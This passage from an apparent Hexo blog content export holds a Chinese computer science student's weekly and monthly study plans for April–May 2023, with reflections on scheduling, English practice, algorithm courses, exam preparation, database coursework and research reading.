<h2 id="每日复盘"><a href="#每日复盘" class="headerlink" title="每日复盘"></a>每日复盘</h2><h3 id="周一"><a href="#周一" class="headerlink" title="周一"></a>周一</h3><p>1. </p>
<h3 id="周二"><a href="#周二" class="headerlink" title="周二"></a>周二</h3><p>1. </p>
<h3 id="周三"><a href="#周三" class="headerlink" title="周三"></a>周三</h3><p>1. </p>
<h3 id="周四"><a href="#周四" class="headerlink" title="周四"></a>周四</h3><p>1. </p>
<h3 id="周五"><a href="#周五" class="headerlink" title="周五"></a>周五</h3><p>1. </p>
<p>2. </p>
<h3 id="周六"><a href="#周六" class="headerlink" title="周六"></a>周六</h3><h3 id="周日"><a href="#周日" class="headerlink" title="周日"></a>周日</h3><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.04.3rd.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.04.3rd.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-04-第三周计划"><a href="#2023-04-第三周计划" class="headerlink" title="2023.04.第三周计划"></a>2023.04.第三周计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><ol>
<li><p>思考如何把其他的技能加入到日常计划中</p>
</li>
<li><p>时间不好安排</p>
<ol>
<li>意味着每项任务不能有超时的机会</li>
<li>一旦超时就意味这后面的内容无法正常完成</li>
<li>计算机网络时间不好安排</li>
<li>是采取任务导向的方式还是时间导向的方式</li>
</ol>
</li>
<li><p>以后一次只干一件事情，不然容易分心</p>
</li>
<li><p>不会去搞大创和挑战杯和互联网+</p>
</li>
<li><p>算法提高课可能要买了</p>
</li>
<li><p>看网课最好不要超过2倍速，表面上看学习的时间变快，但是会牺牲掉记忆和思考的时间，有点得不偿失。</p>
</li>
<li><p>感觉上课的时间还是要利用起来</p>
<ol>
<li>最好是看网课，这样更加专注一点</li>
<li>上课不太适合做题<ol>
<li>首先，环境太嘈杂，不好认真做题</li>
<li>容易走神</li>
</ol>
</li>
<li>有那些网课<ol>
<li>acwing，英语网课，408</li>
</ol>
</li>
</ol>
</li>
<li><p>晚上不适宜看网课</p>
<ol>
<li>适合做事情</li>
<li>做一些创造性的事情</li>
</ol>
</li>
<li><p>目前遇到的困境</p>
<ol>
<li>无法做到孤注一掷的选择考研</li>
<li>先要给自己留一条退路</li>
<li>主要还是对科研的把握程度不够</li>
<li>想要去做软件来留一条退路</li>
</ol>
</li>
<li><p>学习四步走：</p>
<ol>
<li>20小时入门一项技能的重点</li>
</ol>
</li>
<li><p>全身心投入</p>
</li>
<li><p>使用一定的方法</p>
</li>
<li><p>每天45分钟，坚持一个月</p>
</li>
<li><p>入门一项技能的四个步骤</p>
</li>
<li><p>拆解你的学习目标</p>
<ol>
<li>想好你最后要达成什么效果</li>
<li>将技能分解成一个个小部分</li>
<li></li>
</ol>
</li>
<li><p>找到3到5钟学习资源</p>
<ol>
<li>在学习资料之间还有进行比较</li>
<li>找到更加适合自己的学习资料</li>
<li>如何比较也一个需要研究的问题</li>
</ol>
</li>
<li><p>要有一定程度的理论学习（这能够帮助你自我纠错）</p>
<ol>
<li>不能沉迷于练习，没有理论的指导，效率很低</li>
<li>也不能沉迷于理论，没有练习也只是纸上谈兵</li>
</ol>
</li>
<li><p>不要因为学习理论而推迟练习</p>
<ol>
<li>排除干扰</li>
<li>练习20小时</li>
</ol>
</li>
<li><p>TED演讲还是在自习室看会比较好</p>
</li>
<li></li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>调整状态</li>
<li></li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>离散数学完成作业就行了</li>
<li>思考一下科研的未来的规划，和魏老师沟通一下</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>acwing算法基础课的题全部都刷完</li>
<li>网络层的题目全部刷完</li>
<li>学习算法的时间要不要缩短</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>先每天进行一篇短文的精听训练</li>
<li>看一小时的短文练习</li>
<li>精听5篇材料</li>
<li>这周至少把阅读理论课看完</li>
<li>先将英语阅读理论网课看完（还差3次课）<ol>
<li>看完以后开始不断的练习</li>
<li>0.5 听力 10min练习 0.5h 讲评</li>
</ol>
</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>现在暂时不需要编程</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>思考一下理财下一步要怎么走</li>
<li>定期的关注考研资讯</li>
<li>去网上收集经验贴</li>
<li>学习pr</li>
<li>低俗小说</li>
<li>TED至少看2个演讲</li>
<li>盘串</li>
<li>冥想</li>
</ol>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（10-00-12-00）"><a href="#上午（10-00-12-00）" class="headerlink" title="上午（10:00-12:00）"></a>上午（10:00-12:00）</h3><ol>
<li>英语听力精听练习</li>
<li>英语阅读的网课学习</li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li>学习算法</li>
<li>学习acwing网课和刷题</li>
<li>一小时看课，一小时刷题</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>后面的情况是408的学习</li>
<li>计算机网络</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>先应付学校课程作业</li>
<li>进行科研任务的研究</li>
<li>最后花半个小时进行时间的规划</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>看电影</li>
<li>冥想</li>
</ol>
<h2 id="每日复盘"><a href="#每日复盘" class="headerlink" title="每日复盘"></a>每日复盘</h2><h3 id="周一"><a href="#周一" class="headerlink" title="周一"></a>周一</h3><p>1. </p>
<h3 id="周二"><a href="#周二" class="headerlink" title="周二"></a>周二</h3><p>1. </p>
<h3 id="周三"><a href="#周三" class="headerlink" title="周三"></a>周三</h3><p>1. </p>
<h3 id="周四"><a href="#周四" class="headerlink" title="周四"></a>周四</h3><p>1. </p>
<h3 id="周五"><a href="#周五" class="headerlink" title="周五"></a>周五</h3><p>1. </p>
<p>2. </p>
<h3 id="周六"><a href="#周六" class="headerlink" title="周六"></a>周六</h3><h3 id="周日"><a href="#周日" class="headerlink" title="周日"></a>周日</h3><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.04.4th.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.04.4th.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-04-第四周计划"><a href="#2023-04-第四周计划" class="headerlink" title="2023.04.第四周计划"></a>2023.04.第四周计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><ol>
<li><p>将学习任务重新划分成6个层次<br>1. </p>
</li>
<li><p>要学习多种学科每天各科都学一点效率高还是在一段时间内学一到两科学过之后再学其他的效率高记得牢？</p>
<ol>
<li>如果一天内切换频繁，效果很差，如果隔了好多天才能再接着学这一科，效果更差</li>
<li>不要平均分配时间，阶段性分配，阶段主要科目给大块时间，其他科目可以进展很慢但是不要很长时间不看，相隔不要超过两天，保持记忆</li>
<li>宏观上选择一段时间内只主攻一个科目，而在微观上进行多学科切换</li>
<li>一天内长时间学习一个科目容易学习疲劳</li>
</ol>
</li>
<li><p>思考五一安排</p>
<ol>
<li>完成数据库课设</li>
</ol>
</li>
<li><p>本周先把计算机网络学完，如果有时间在进行，英语方面的学习</p>
</li>
<li><p>要加强实验的课前预习，可以提高学习效率，掌握更多东西</p>
</li>
<li><p>感觉要花更多的时间来学习英语</p>
</li>
<li><p>感觉目前单词不是重点	</p>
<ol>
<li>单词要背的还很快</li>
<li>现在重点是在做题方法的训练不够</li>
</ol>
</li>
<li><p>公众号<br>1. </p>
</li>
<li><p>思考B站的规划</p>
</li>
<li><p>现在是上午的时间很难规划</p>
</li>
<li><p>上午不太适合刷题</p>
</li>
<li><p>比较适合刷网课</p>
</li>
<li><p>但是如果是百度网盘手机有没有二倍速</p>
</li>
<li></li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>将计网全部结束</li>
<li>将科研的讲解完成</li>
<li>制定下一个月的计划</li>
<li>制定数据库课程设计计划</li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>离散数学完成作业就行了</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>计算机网络</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>每天只需听力即可</li>
<li></li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>数据库原理</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>思考一下理财下一步要怎么走</li>
<li>定期的关注考研资讯</li>
<li>去网上收集经验贴</li>
<li>学习pr</li>
<li>教父</li>
<li>盘串</li>
<li>冥想</li>
</ol>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（9-00-12-00）"><a href="#上午（9-00-12-00）" class="headerlink" title="上午（9:00-12:00）"></a>上午（9:00-12:00）</h3><ol>
<li>英语听力精听练习</li>
<li>英语阅读的网课学习</li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li>学习算法</li>
<li>学习acwing网课和刷题</li>
<li>一小时看课，一小时刷题</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>后面的情况是408的学习</li>
<li>计算机组成原理</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>科研任务</li>
<li>学校作业</li>
<li></li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>看电影</li>
<li>冥想</li>
</ol>
<h2 id="每日复盘"><a href="#每日复盘" class="headerlink" title="每日复盘"></a>每日复盘</h2><h3 id="周一"><a href="#周一" class="headerlink" title="周一"></a>周一</h3><p>1. </p>
<h3 id="周二"><a href="#周二" class="headerlink" title="周二"></a>周二</h3><p>1. </p>
<h3 id="周三"><a href="#周三" class="headerlink" title="周三"></a>周三</h3><p>1. </p>
<h3 id="周四"><a href="#周四" class="headerlink" title="周四"></a>周四</h3><p>1. </p>
<h3 id="周五"><a href="#周五" class="headerlink" title="周五"></a>周五</h3><p>1. </p>
<p>2. </p>
<h3 id="周六"><a href="#周六" class="headerlink" title="周六"></a>周六</h3><h3 id="周日"><a href="#周日" class="headerlink" title="周日"></a>周日</h3><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.04.MonthPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.04.MonthPlan/</url>
    <content><![CDATA[<h1 id="2023-4月计划"><a href="#2023-4月计划" class="headerlink" title="2023.4月计划"></a>2023.4月计划</h1><h2 id="上月总结"><a href="#上月总结" class="headerlink" title="上月总结"></a>上月总结</h2><ol>
<li>思考下个月的安排</li>
<li></li>
</ol>
<h2 id="规划"><a href="#规划" class="headerlink" title="规划"></a>规划</h2><ol>
<li>认证杯</li>
<li>学习计算机网络</li>
<li>完成数据库课设</li>
<li>完成计算机组成的学习</li>
<li></li>
</ol>
<h2 id="Subject-to-Arrange"><a href="#Subject-to-Arrange" class="headerlink" title="Subject to Arrange"></a>Subject to Arrange</h2><h3 id="数学-x2F-科研"><a href="#数学-x2F-科研" class="headerlink" title="数学&#x2F;科研"></a>数学&#x2F;科研</h3><ol>
<li>数学建模训练</li>
<li>科研任务展开</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>阅读的专项练习</li>
</ol>
<h3 id="计算机-x2F-编程"><a href="#计算机-x2F-编程" class="headerlink" title="计算机&#x2F;编程"></a>计算机&#x2F;编程</h3><ol>
<li>要结束数据库课程</li>
<li>完成计网的学习</li>
<li>蓝桥杯比赛</li>
<li>完成算法基础课的学习</li>
<li></li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.05.2nd.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.05.2nd.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-04-第四周计划"><a href="#2023-04-第四周计划" class="headerlink" title="2023.04.第四周计划"></a>2023.04.第四周计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><ol>
<li>思考如何将每日的日常任务串联起来</li>
<li>思考如何加上英语的学习</li>
<li>这周完成的java理论的学习</li>
<li>英语的方法学习应该单独划分为一个学习任务，而不能放在每天任务中，这样更加系统化。</li>
<li>下周重新进行数据库课程的设计</li>
<li>重新更新了每日任务的安排<ol>
<li>先将每日任务完成，才能进行这周的学习任务<ol>
<li>顺序：冥想，算法，英语</li>
</ol>
</li>
<li>弱化时间的重要性，而加重任务的优先级</li>
<li>如何处理同级的任务。</li>
</ol>
</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>java的学习</li>
<li></li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>离散数学完成作业就行了</li>
<li>要去研究数据驱动分解的方法</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>操作系统</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>每天只需听力即可</li>
<li>单词该怎么研究呢</li>
<li>每天大致的计划<ol>
<li>阅读一篇</li>
<li>听力一段</li>
<li>单词100词</li>
</ol>
</li>
<li>大致要30min</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>Java基础的学习</li>
<li>Linux的部署</li>
<li>SSM的学习</li>
<li>springboot2</li>
<li></li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（9-00-12-00）"><a href="#上午（9-00-12-00）" class="headerlink" title="上午（9:00-12:00）"></a>上午（9:00-12:00）</h3><ol>
<li>每日任务</li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li>每日任务</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>后面的情况是408的学习</li>
<li>计算机组成原理</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>科研任务</li>
<li>学校作业</li>
<li></li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>看电影</li>
<li>冥想</li>
</ol>
<h2 id="每日复盘"><a href="#每日复盘" class="headerlink" title="每日复盘"></a>每日复盘</h2><h3 id="周一"><a href="#周一" class="headerlink" title="周一"></a>周一</h3><p>1. </p>
<h3 id="周二"><a href="#周二" class="headerlink" title="周二"></a>周二</h3><p>1. </p>
<h3 id="周三"><a href="#周三" class="headerlink" title="周三"></a>周三</h3><p>1. </p>
<h3 id="周四"><a href="#周四" class="headerlink" title="周四"></a>周四</h3><p>1. </p>
<h3 id="周五"><a href="#周五" class="headerlink" title="周五"></a>周五</h3><p>1. </p>
<p>2. </p>
<h3 id="周六"><a href="#周六" class="headerlink" title="周六"></a>周六</h3><h3 id="周日"><a href="#周日" class="headerlink" title="周日"></a>周日</h3><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.05.3rd.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.05.3rd.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-05-第三周计划"><a href="#2023-05-第三周计划" class="headerlink" title="2023.05.第三周计划"></a>2023.05.第三周计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><ol>
<li>要等项目结束要思考一下，项目对日常生活的一个调整</li>
<li>还是要重新调整一下英语的学习</li>
<li>抓紧完成项目，尽快调整学习节奏</li>
<li>还是容易被其他事情所影响全部的进度</li>
<li>莫当工具人</li>
<li>上岸第一剑，先斩意中人</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>进行科研的研究</li>
<li>数据库课程设计</li>
<li>实验</li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>离散数学完成作业就行了</li>
<li>要去研究数据驱动分解的方法</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>算法题一天两道</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>每天只需听力即可</li>
<li>单词该怎么研究呢</li>
<li>每天大致的计划<ol>
<li>阅读一篇</li>
<li>听力一段</li>
<li>单词100词</li>
</ol>
</li>
<li>大致要30min</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>完成数据库课程设计</li>
<li></li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（9-00-12-00）"><a href="#上午（9-00-12-00）" class="headerlink" title="上午（9:00-12:00）"></a>上午（9:00-12:00）</h3><ol>
<li>每日任务</li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li>每日任务</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><p>1. </p>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>科研任务</li>
<li>学校作业</li>
<li></li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>看电影</li>
<li>冥想</li>
</ol>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.05.4th.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.05.4th.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-05-第四周计划"><a href="#2023-05-第四周计划" class="headerlink" title="2023.05.第四周计划"></a>2023.05.第四周计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><ol>
<li><p>开会</p>
</li>
<li><p>经过时间的验证，理论和实践应该是相辅相成的，不能光理论和不进行实践，相应的也不能光时间而不学习理论</p>
</li>
<li><p>手机感觉如何解决</p>
</li>
<li><p>可以将以前的写的周计划总结的经验汇总一下，形成一套理论</p>
</li>
<li><p>思考平板和手机的定位</p>
<ol>
<li>感觉每天刷手机浪费的时间太多了</li>
<li>主要是短视频和象棋</li>
</ol>
</li>
<li><p>感觉项目经验还差很多</p>
</li>
<li><p>要思考英语学习未来的计划</p>
</li>
<li><p>冥想到最后也是没有坚持下来</p>
<ol>
<li>思考一下有没有什么办法</li>
</ol>
</li>
<li><p>至少保证每天有10个小时的学习时间</p>
</li>
<li><p>提高学习量有两种方式</p>
</li>
<li><p>增加学习时间<br>1. </p>
</li>
<li><p>提高学习效率</p>
</li>
<li><p>现在有俩个任务</p>
</li>
<li><p>这两周要开始期末考试的复习了</p>
</li>
<li><p>先选择</p>
</li>
<li><p>后大题</p>
</li>
<li><p>目前来说就只有两个科目</p>
</li>
<li><p>考虑一下优先级</p>
</li>
<li><p>暑假的实习比较重要一点</p>
</li>
<li><p>现在先全部的精力全部用来准备实习和期末考试中</p>
</li>
<li><p>剩下的都不是很重要</p>
</li>
<li><p>确定一下这周的目标</p>
</li>
<li><p>把微服务的理论全部学完</p>
</li>
<li><p>下周要把巩固实践的掌握情况</p>
</li>
<li><p>下个月还要背一下八股文</p>
</li>
<li></li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>数据库课程设计这周就能够完成</li>
<li>数据驱动分解</li>
<li>电工杯</li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>离散剩下的课程预习完成</li>
<li>要将况琨那篇论文看完，争取在16周之前结束这个学期的工作</li>
<li>还有考虑一下暑假实习的问题</li>
<li>还要思考一下数学建模未来的安排<ol>
<li>要多学习一类优化问题的，扩展一下技能库</li>
<li>可以适应更多的题目</li>
<li></li>
</ol>
</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>算法题一天两道<ol>
<li>要赶紧将算法结束掉，为其他内容的学习腾出时间</li>
<li>现在距离整个系统的学完还差1&#x2F; 4 的时间</li>
<li>现在就是感觉刷算法题的性价比比较低</li>
<li>现在是应该调整一下学习的策略</li>
<li>将理论结束就可以进入到每天一题的状态中</li>
<li></li>
</ol>
</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>目前也没有学习的方向</li>
<li>目前也没有英语考试的压力</li>
<li>也不需要备考</li>
<li>而且感觉英语的学习需要系统性，每天学一点也学不了什么</li>
<li>不如把时间用于其他需要系统性的技能上</li>
<li></li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>spring boot 项目<ol>
<li>现在的想法是先将要用的技术先写完</li>
<li>后面还是做项目，积累项目经验</li>
<li>主要是整个大三要做的事情</li>
<li>感觉</li>
</ol>
</li>
<li>ai绘图</li>
<li></li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>象棋引擎</li>
</ol>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（9-00-12-00）"><a href="#上午（9-00-12-00）" class="headerlink" title="上午（9:00-12:00）"></a>上午（9:00-12:00）</h3><ol>
<li>每日任务</li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li>每日任务</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><p>1. </p>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>科研任务</li>
<li>学校作业</li>
<li></li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>看电影</li>
<li>冥想</li>
</ol>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.05.5th.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.05.5th.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-05-第五周计划"><a href="#2023-05-第五周计划" class="headerlink" title="2023.05.第五周计划"></a>2023.05.第五周计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><ol>
<li><p>终于把项目完成了</p>
</li>
<li><p>剩下只要把实验报告写完，就结束了</p>
</li>
<li><p>这个要开始准备期末考试了</p>
</li>
<li><p>科研还剩下一点，快点结束</p>
<ol>
<li>搞定ai绘图</li>
</ol>
<p>	</p>
</li>
<li><p>还有微服务这个月能不能学完</p>
<ol>
<li>docker还是无法搞定</li>
</ol>
</li>
<li><p>操作系统和机组要找个时间安排学习一下</p>
<ol>
<li>思考一下找个时间来学习一下</li>
</ol>
</li>
<li><p>重新把微服务的所有实践做一下</p>
</li>
<li><p>现在的时间只剩下半个月多了</p>
<ol>
<li>思考现在还要学些什么</li>
<li></li>
</ol>
</li>
<li></li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>准备复习期末考试</li>
<li>微服务的大致理论的学习</li>
<li>这两周论文的就要结束</li>
<li>这个可能还要把数据库报告写完</li>
<li></li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>离散剩下的课程预习完成</li>
<li>要将况琨那篇论文看完，争取在16周之前结束这个学期的工作</li>
<li>还有考虑一下暑假实习的问题</li>
<li>还要思考一下数学建模未来的安排<ol>
<li>要多学习一类优化问题的，扩展一下技能库</li>
<li>可以适应更多的题目</li>
<li></li>
</ol>
</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>不在进行算法题的学习</li>
<li>现在要把时间留给其他的任务</li>
<li>这个在目前这种情况，性价比太低了</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>目前也没有学习的方向</li>
<li>目前也没有英语考试的压力</li>
<li>也不需要备考</li>
<li>而且感觉英语的学习需要系统性，每天学一点也学不了什么</li>
<li>不如把时间用于其他需要系统性的技能上</li>
<li></li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>spring boot 项目<ol>
<li>现在的想法是先将要用的技术先写完</li>
<li>后面还是做项目，积累项目经验</li>
<li>主要是整个大三要做的事情</li>
<li>感觉</li>
</ol>
</li>
